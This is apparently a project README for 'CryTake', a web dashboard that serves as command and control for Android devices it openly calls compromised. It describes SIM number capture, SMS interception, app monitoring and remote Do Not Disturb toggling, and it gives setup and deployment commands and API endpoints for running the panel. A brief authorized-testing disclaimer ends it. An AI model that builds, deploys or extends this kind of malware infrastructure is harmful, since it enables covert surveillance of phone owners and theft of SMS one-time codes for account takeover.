# CryTake - Web-based C2 Dashboard for Decry

A web dashboard for remote command and control of compromised Android devices. Provides real-time device monitoring, SIM number capture, SMS interception, and app monitoring capabilities.

## Architecture

```
[Admin Browser] → [CryTake Dashboard (Node.js)] → [Decry Android App]
     │                      │                           │
     │   Web UI / API       │   Command Queue          │
     │                      │                           │
     ▼                      ▼                           ▼
[C2 Admin]         [Polling Endpoint]        [Remote Control]
                                      (10s polling)
```

## Features

### Device Management
- View all connected devices with real-time status
- Monitor device health, SIM numbers, and Android version
- Track DND (Do Not Disturb) status
- Control monitoring activation per device

### Remote Commands
- 📞 Get SIM Number - Request SIM card information
- 🔕 Toggle DND - Enable/disable Do Not Disturb mode
- 📥 Receive SMS - Activate SMS interception mode
- 📋 Stop SMS - Deactivate SMS interception
- 👁️ Start Monitor - Begin app monitoring
- 🔄 Refresh - Request current device status

## Setup

### Prerequisites
- Node.js 18+
- Admin token (default: `admin` or set via `ADMIN_TOKEN` env var)

### Local Development
```bash
# Clone the repository
git clone https://github.com/Hailer367/CryTake.git
cd CryTake

# Install dependencies
npm install

# Run locally
npm start
# Dashboard runs on http://localhost:3000
```

### Deploy to Vercel
```bash
npm install -g vercel
vercel --prod
```

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/devices` | GET | List all registered devices |
| `/api/command` | POST | Queue a command for a device |
| `/api/status` | GET | Overall system status |
| `/health` | GET | Health check endpoint |

## License
This software is for security research and authorized testing only. Always obtain proper authorization before deploying this application.
